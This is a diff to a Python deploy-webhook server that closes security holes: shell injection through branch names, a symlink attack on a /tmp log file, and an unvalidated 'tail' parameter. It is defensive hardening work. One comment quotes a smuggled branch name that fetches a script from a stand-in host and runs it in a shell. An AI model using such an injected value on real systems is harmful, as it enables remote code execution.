@@ -23,11 +23,17 @@ import tomllib
 from urllib.parse import urlparse, parse_qs
 
 _VERSION_RE = re.compile(r'^v\d{4}\.\d{2}\.\d+$')
+# Git branch names that are safe to put in a shell command: letters, digits and
+# the handful of separators a branch actually uses. No spaces, quotes or metachars.
+_REF_RE     = re.compile(r'^[A-Za-z0-9._/-]{1,100}$')
 
 SECRET   = os.environ.get('DEPLOY_SECRET', '')
 REPO     = os.path.expanduser(os.environ.get('REPO_DIR', '~/Splouch'))
 PORT     = int(os.environ.get('DEPLOY_PORT', '9000'))
-LOG_FILE = '/tmp/splouch-deploy.log'
+# Under the repo, not /tmp: the name is predictable and /tmp is world-writable, so
+# any local account could pre-create it as a symlink and have this process — which
+# opens it 'wb' on every deploy — truncate a file of their choosing.
+LOG_FILE = os.path.join(REPO, 'cloud', '.deploy.log')
 
 
 def _update_config():
@@ -130,9 +136,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
         _preserve_domain()
         if version == 'master':
             cmd = f'cd {REPO} && git fetch origin && git reset --hard origin/master'
-        elif version in extra_refs:
-            # Branch deploy: force the working tree to origin/<branch>. Safe to
-            # interpolate because `version` is confined to the extra_branches allowlist.
+        elif version in extra_refs and _REF_RE.match(version):
+            # Branch deploy: force the working tree to origin/<branch>. The
+            # allowlist is read from update_config.toml, a *tracked* file that a
+            # deploy itself rewrites, so "it came from the allowlist" says nothing
+            # about its shape — a branch named `x;curl evil|sh` would be a command,
+            # not a ref. _REF_RE is what makes it safe to interpolate.
             cmd = f'cd {REPO} && git fetch origin && git reset --hard origin/{version}'
         elif _VERSION_RE.match(version):
             # A specific release tag. `version` is validated against _VERSION_RE,
@@ -221,7 +230,15 @@ class Handler(http.server.BaseHTTPRequestHandler):
             return
         params = parse_qs(urlparse(self.path).query)
         source = params.get('source', ['app'])[0]
-        tail   = str(min(int(params.get('tail', ['300'])[0]), 1000))
+        # Clamped both ways, and non-numeric input falls back rather than raising:
+        # this runs outside the try below, so a bad value used to take the whole
+        # handler down with an unhandled ValueError. A negative would also reach
+        # `--tail -5`, which docker reads as an option.
+        try:
+            tail = min(max(int(params.get('tail', ['300'])[0]), 1), 1000)
+        except (TypeError, ValueError):
+            tail = 300
+        tail = str(tail)
         compose = f'{REPO}/cloud/docker-compose.yml'
 
         cmds = {
